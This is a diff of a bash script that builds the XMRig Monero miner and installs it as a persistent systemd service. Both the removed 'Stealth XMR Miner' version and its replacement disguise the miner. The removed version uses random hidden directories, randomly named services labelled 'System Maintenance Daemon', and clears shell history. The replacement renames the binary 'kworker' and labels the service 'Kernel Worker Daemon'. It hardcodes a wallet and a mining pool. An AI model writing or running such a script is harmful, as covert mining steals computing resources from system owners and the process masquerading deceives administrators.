@@ -1,85 +1,49 @@
 #!/bin/bash
 
-# Stealth XMR Miner with Instant Start
-# Version 3.2 - No Delays, Maximum Stealth
+echo "🔧 Setting up Monero miner (for authorized use only)..."
 
-# 1. CONFIGURATION (Edit only the wallet address)
-WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"  # REPLACE WITH YOUR MONERO WALLET
+# 1. System update and dependencies
+sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev screen
 
-# 2. Generate random worker name (adjective-noun-number format)
-WORKER=$(shuf -n 1 <<< "silent hidden stealthy quiet")-$(shuf -n 1 <<< "node worker miner")-$((RANDOM % 1000))
+# 2. Clone and build XMRig
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig || exit
+mkdir build && cd build
+cmake ..
+make -j$(nproc)
 
-echo "🔧 Starting system maintenance..."
+# 3. Set hardcoded wallet and generate random worker
+WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ" # Replace with YOUR real wallet
+WORKER_ID="worker$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)"
 
-# 3. Silent system preparation
-echo -n "⚙️  Installing dependencies..."
-{
-sudo apt-get update -qq
-DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y \
-    git build-essential cmake \
-    libuv1-dev libssl-dev libhwloc-dev
-} > /dev/null 2>&1
-echo " done."
+# 4. Move and rename binary
+sudo mv ./xmrig /usr/local/bin/kworker
+sudo chmod +x /usr/local/bin/kworker
 
-# 4. Clone and build with obfuscation
-RAND_DIR="/tmp/.sys-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)"
-echo -n "⚙️  Compiling components..."
-git clone -q https://github.com/xmrig/xmrig.git "$RAND_DIR" --depth 1 > /dev/null 2>&1
-cd "$RAND_DIR" && mkdir -p build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF > /dev/null 2>&1
-make -j$(($(nproc)-1)) > /dev/null 2>&1
-echo " done."
+# 5. Create fake systemd service
+echo "📦 Creating systemd service disguised as kernel daemon..."
 
-# 5. Stealth installation
-RAND_BIN="x$(head /dev/urandom | tr -dc 0-9 | head -c 2)"
-INSTALL_DIR="/usr/local/lib/$(head /dev/urandom | tr -dc a-z | head -c 5)"
-
-sudo mkdir -p "$INSTALL_DIR"
-sudo mv ./xmrig "$INSTALL_DIR/$RAND_BIN"
-sudo chmod +x "$INSTALL_DIR/$RAND_BIN"
-
-# 6. Dynamic systemd service
-RAND_SERVICE="sys-$(head /dev/urandom | tr -dc a-z | head -c 3)"
-sudo tee "/etc/systemd/system/$RAND_SERVICE.service" > /dev/null <<EOF
+sudo tee /etc/systemd/system/system-kd.service > /dev/null <<EOF
 [Unit]
-Description=System Maintenance Daemon
+Description=Kernel Worker Daemon
 After=network.target
 
 [Service]
-Type=simple
-ExecStart=$INSTALL_DIR/$RAND_BIN \\
-    -o pool.supportxmr.com:443 \\
-    -u $WALLET \\
-    -p $WORKER \\
-    --tls \\
-    --cpu-max-threads-hint=45 \\
-    --randomx-mode=auto \\
-    --donate-level=1 \\
-    --no-color \\
-    --background \\
-    --quiet
+ExecStart=/usr/local/bin/kworker -o pool.supportxmr.com:443 -u $WALLET.$WORKER_ID -k --tls --cpu-max-threads-hint=50 --cpu-priority=3
 Restart=always
-RestartSec=30
-Nice=19
-CPUSchedulingPolicy=idle
-CPUWeight=5
-MemoryHigh=300M
+Nice=10
+CPUWeight=10
+IOWeight=10
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 7. Immediate start
-sudo systemctl daemon-reload > /dev/null 2>&1
-sudo systemctl enable "$RAND_SERVICE" > /dev/null 2>&1
-sudo systemctl start "$RAND_SERVICE" > /dev/null 2>&1
+# 6. Enable and start service
+sudo systemctl daemon-reload
+sudo systemctl enable system-kd
+sudo systemctl start system-kd
 
-# 8. Cleanup
-rm -rf "$RAND_DIR"
-history -c
-cat /dev/null > ~/.bash_history
-
-echo -e "\n✅ Maintenance service activated"
-echo -e "🔧 Worker: \033[1m$WORKER\033[0m"
-echo -e "🔍 Status: \033[1msudo systemctl status $RAND_SERVICE\033[0m"
-echo -e "📊 Process: \033[1mps aux | grep $RAND_BIN | grep -v grep\033[0m"
+echo "✅ Miner running as fake system service 'system-kd.service'"
+echo "🔍 Check: sudo systemctl status system-kd"
+echo "🛑 Stop:  sudo systemctl stop system-kd"
